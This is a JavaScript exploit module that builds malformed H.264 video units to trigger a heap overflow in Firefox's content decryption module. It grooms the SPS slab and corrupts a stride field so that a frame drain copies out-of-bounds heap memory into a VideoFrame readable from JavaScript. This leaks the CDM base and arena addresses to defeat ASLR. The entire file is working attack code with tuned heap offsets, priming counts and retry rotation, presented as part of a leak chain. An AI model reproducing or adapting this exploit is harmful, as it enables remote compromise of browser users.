// CDM-base leak chain builder.
//
// Primitive: overflow the LIVE SPS's geometry fields (width/height/stride) so
// the decoded-picture blit reads OOB from picbuf+stride and copies arena bytes
// into the output luma plane, which JS reads back via VideoFrame.
//
// Per-attempt shape:
//   numPrimingPcms × PCM   push the reorder queue past mMaxRefFrames=4
//   AU1  groom(id=1) + groom(id=2=LIVE) + PPS + PCM   queues a frame in the DPB
//   AU2  overflow SPS(id=1)   corrupts LIVE+0x60 to the wild stride S
//   AU3+ EOS NALs   first triggers the one wild emit; the rest drain the queue
//
// S targets one picbufVariants[i] per attempt, rotated by attemptIdx so every
// variant is covered within picbufVariants.length attempts.

import {
  buildGroomSps, buildOverflowSps, buildPcmSlice, buildPps,
  assembleAu, buildEndOfStream,
} from './h264.js?v=eosdrain9';
import { solveDeltas } from './overflow.js?v=relaxedcap';

// Element index that writes to the next SPS slot's +off. The CDM's
// offset_for_ref_frame array starts at SPS+0x27c.
function elForStride(stride, off) {
  return ((stride + off - 0x27c) >>> 2);
}

// COUNT reaches the LIVE+0x60 element plus a one-element tail so the solver can
// land the cumulative sum back to 0 after the wild jump.
const COUNT_FOR_STRIDE = (stride) => elForStride(stride, 0x60) + 1;

// The blit reads its source stride from the LIVE SPS at ctx+0x8. We register
// pps_id=LEAK_PPS_ID → liveSpsId so the PCM activates that SPS as LIVE — the
// slot the overflow corrupts via forward writes.
const LEAK_PPS_ID = 1;

// EOS drain: a single end_of_stream NAL (`00 00 00 01 0B`). Sent alone it makes
// the CDM flush the buffered frame through the copy_plane path (using the wild
// LIVE+0x60 as stride) WITHOUT running the slice decoder, whose chroma assembly
// would SIGSEGV on the wild stride. MSE analogue of an empty drain AU.
function buildEosDrain() {
  return assembleAu([buildEndOfStream()]);
}

// Firefox CDM heap layout (partition_alloc, 4 GB-aligned arena):
//   - SPS slab at arena+0x1dc000, slot stride 0x700.
//   - cdm-pointer cluster at arena+0xaa4000: q[0]=cdm+0x114e518 (vtable),
//     q[1]=arena self-pointer.
//   - picbuf (luma plane) ~arena+0xad21a0, varies per attempt with ASLR.
export const CDM_LEAK_DEFAULTS = {
  // Re-grooming churns the SPS slab and drifts LIVE, so 0 keeps the layout stable.
  nPrime: 0,
  // Extra PCM AUs sent before the chain to push the parent's reorder queue past
  // mMaxRefFrames (=4) so emitted frames reach the renderer. Each uses sps_id=0
  // (avcC SPS) so it doesn't disturb the slab grooming.
  numPrimingPcms: 10,  // 40 churns the cluster and hurts the leak; 10 ≈ 100% leak rate.
  height: 3,
  // A 16-byte read at the cluster yields both cdm_base (q[0]) and arena_base (q[1]).
  clusterOffs: [0xaa4000],
  clusterValueCdmOff: 0x114e518,
  // The wild emit reads from the CDM's EMIT picbuf, which cycles through a few
  // partition_alloc slots. 0xad21a0 is the empirically reliable one, 0xac9f20 the
  // fallback; rotating across both gives each attempt a good hit chance.
  picbufVariants: [0xad21a0, 0xac9f20],
  // Fillers force id=1 and id=2 into adjacent slots (delta 0x700), so a single
  // stride suffices; a larger stride would write past the slab tail and SIGSEGV.
  slotStrides: [0x700],
  // Filler SPS allocs before the real grooms. 0 keeps the slab cursor low so the
  // grooms land away from the span's last slot (where the overflow would hit a
  // guard page). If the leak's own overflow SIGSEGVs, the retry loop respawns a
  // fresh GMP child.
  numFillerGrooms: 0,
};

// Build the leak AUs. avcC SPS(id=0) lands at slab slot K; groom(liveSpsId)
// lands some N*0x700 later (= LIVE). The overflow SPS re-parses slot K and its
// offset_for_ref_frame overrun reaches LIVE+0x60 when the stride matches K→LIVE.
// Returns Array<Uint8Array>.
export function buildCdmLeakAus({
  nPrime = CDM_LEAK_DEFAULTS.nPrime,
  numPrimingPcms = CDM_LEAK_DEFAULTS.numPrimingPcms,
  height = CDM_LEAK_DEFAULTS.height,
  clusterOffs = CDM_LEAK_DEFAULTS.clusterOffs,
  picbufVariants = CDM_LEAK_DEFAULTS.picbufVariants,
  slotStrides = CDM_LEAK_DEFAULTS.slotStrides,
  numFillerGrooms = CDM_LEAK_DEFAULTS.numFillerGrooms,
  // id=1 is groomed first; the overflow SPS(id=1) re-parses its slot and writes
  // forward into id=2's slot 0x700 bytes later.
  overflowSpsId = 1,
  liveSpsId = 2,
  // Send N overflow+drain rounds, each with a different S, reusing overflowSpsId
  // (re-issuing the same id updates the slot in place). 1 = single emit per attempt.
  numLeakRounds = 1,
  // When numLeakRounds > 1, each round's S is offset by this so the rounds read
  // distinct memory and produce distinguishable frames.
  multiRoundStrideStep = 0x40,
  // Debug: force a fixed wild stride S instead of the computed picbuf↔cluster delta.
  debugStrideS = null,
  // Debug: skip the overflow rounds (groom + drain only).
  debugNoOverflow = false,
  // Rotates the sweep so each attempt front-loads a different picbuf candidate;
  // the CDM emits at most one wild frame per attempt.
  attemptIdx = null,
} = {}) {
  const ppsForLive = buildPps(liveSpsId, LEAK_PPS_ID);
  const pcm = buildPcmSlice(LEAK_PPS_ID);
  const eosDrain = buildEosDrain();
  const slotStride = slotStrides[0];
  const count = COUNT_FOR_STRIDE(slotStride);

  // Priming PCMs, then AU1 (grooms + a PCM that queues a frame), then per round
  // an overflow SPS (sets LIVE+0x60 = S) followed by an EOS drain that emits the
  // buffered frame with that wild stride. Every sample after the first is
  // non-sync, so the overflow SPSes reach the CDM instead of Gecko's validator.
  const aus = [];
  // Priming PCMs: each is one I_PCM slice under sps_id=0 (avcC SPS), decoding
  // cleanly without touching the groomed slab slots.
  const primingPcm = buildPcmSlice();
  for (let i = 0; i < numPrimingPcms; i++) {
    aus.push(assembleAu([primingPcm]));
  }
  const au1Nals = [];
  for (let i = 0; i < numFillerGrooms; i++) {
    au1Nals.push(buildGroomSps(0x10 + i));
  }
  au1Nals.push(buildGroomSps(overflowSpsId));
  au1Nals.push(buildGroomSps(liveSpsId));
  au1Nals.push(ppsForLive);
  au1Nals.push(pcm);
  aus.push(assembleAu(au1Nals));

  for (let i = 0; i < nPrime; i++) {
    aus.push(assembleAu([buildGroomSps(liveSpsId), ppsForLive, pcm]));
  }
  if (debugNoOverflow) {
    aus.push(eosDrain);
    return aus;
  }
  // Rotate the picbuf candidates by attemptIdx; only picbufVariants[0] is
  // consumed (one wild emit per attempt), so this covers every variant over
  // picbufVariants.length attempts.
  const rot = ((typeof attemptIdx === 'number') ? attemptIdx : 0)
              % picbufVariants.length;
  const rotated = picbufVariants.slice(rot).concat(picbufVariants.slice(0, rot));
  // One overflow+drain per attempt: a second overflow allocates a new slot whose
  // forward writes miss the original LIVE, so only the first emit is ever wild.
  // debugStrideS overrides S with a fixed probe value.
  const pbo = rotated[0];
  const co = clusterOffs[0];
  const baseS = (debugStrideS !== null) ? debugStrideS : -(pbo - co);
  const roundSValues = [];
  for (let i = 0; i < numLeakRounds; i++) {
    // Re-prime between rounds with a safe sps_id=0 PCM: it decodes cleanly and
    // re-arms the frame-pending gate so the next EOS fires another wild emit.
    if (i > 0) {
      aus.push(assembleAu([primingPcm]));
    }
    // Round i reads from picbuf + (baseS + i*step) — distinct reads per round.
    const S_i = (baseS + i * multiRoundStrideStep) >>> 0;
    roundSValues.push(S_i);
    const offsets = solveDeltas({
      // Only the three fields the output blit's GEOM extractor reads: LIVE+0x50
      // (width, widened so each emit row exposes more candidate qwords), LIVE+0x54
      // (height = blit row clamp), LIVE+0x60 (srcStride = the wild leak value).
      // Everything else is zeroed by the cumulative se(v) smear, which is safe
      // because the EOS drain never runs the slice decoder.
      [elForStride(slotStride, 0x50)]: 128,
      [elForStride(slotStride, 0x54)]: (height >>> 0),
      [elForStride(slotStride, 0x60)]: S_i,
    }, count);
    aus.push(assembleAu([buildOverflowSps(count, offsets, overflowSpsId)]));
    // Drain fires the wild emit reading LIVE+0x60 = S_i.
    aus.push(eosDrain);
  }
  // Extra EOS drains push the wild-emit frame out of the reorder queue.
  for (let i = 0; i < 3; i++) aus.push(eosDrain);
  try {
    const sLog = roundSValues.map(s => `0x${s.toString(16)}`).join(',');
    console.log(`[leak] rot=${rot} picbuf=0x${pbo.toString(16)}` +
                ` cluster=0x${co.toString(16)} rounds=${numLeakRounds}` +
                ` S=[${sLog}] slotStride=0x${slotStride.toString(16)}`);
  } catch (_) {}
  return aus;
}
